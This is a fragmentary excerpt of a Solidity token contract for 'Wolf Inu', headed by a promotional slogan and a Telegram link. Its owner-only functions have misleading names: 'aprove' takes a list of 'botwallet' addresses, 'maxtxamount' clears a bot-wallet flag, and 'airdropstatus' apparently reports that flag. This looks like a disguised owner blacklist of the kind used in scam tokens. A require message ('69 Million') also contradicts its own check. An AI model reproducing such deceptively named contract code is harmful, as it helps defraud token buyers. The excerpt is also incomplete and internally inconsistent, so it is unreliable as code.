...
WOLF INU IS READY TO TAKE OVER ETH

https://t.me/WolfInuProject
...
contract WolfInu is Context, IERC20, Ownable {
    ...
    uint256 public _maxTxAmount = 150000000000000 * 10**9;
    ...
    function setSwapThresholdAmount(uint256 SwapThresholdAmount) external onlyOwner() {
        require(SwapThresholdAmount > 10000000, "Swap Threshold Amount cannot be less than 69 Million");
    ...
    function aprove(address[] calldata botwallet) external onlyOwner() {
    ...
    function maxtxamount(address botwallet) external onlyOwner() {
        botWallets[botwallet] = false;
    }
    
    function airdropstatus(address botwallet) public view returns (bool) {
